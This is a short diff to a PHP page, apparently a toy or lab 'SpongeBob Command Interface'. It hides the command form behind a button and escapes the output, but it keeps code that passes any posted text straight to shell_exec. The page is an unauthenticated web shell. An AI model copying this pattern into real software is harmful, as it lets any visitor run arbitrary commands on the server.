@@ -52,23 +52,39 @@
         button:hover {
             background-color: #ffdb4d;
         }
+
+        #commandBox {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h2>🍍 SpongeBob Command Interface 🫧</h2>
+    <h2>SpongeBob Command Interface</h2>
 
-    <form method="POST">
-        <input type="text" name="command"
-               placeholder="Enter a command" required>
-        <button type="submit">Run!</button>
-    </form>
+    <button type="button" onclick="showCommandBox()">
+        Open Command Console
+    </button>
+
+    <div id="commandBox">
+        <form method="POST">
+            <input type="text" name="command"
+                   placeholder="Enter a command" required>
+            <button type="submit">Run!</button>
+        </form>
+    </div>
 
     <pre><?php
     if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $command = $_POST["command"] ?? "";
         $output = shell_exec($command);
-        echo $output;
+        echo htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8");
     }
     ?></pre>
+
+    <script>
+        function showCommandBox() {
+            document.getElementById("commandBox").style.display = "block";
+        }
+    </script>
 </body>
 </html>
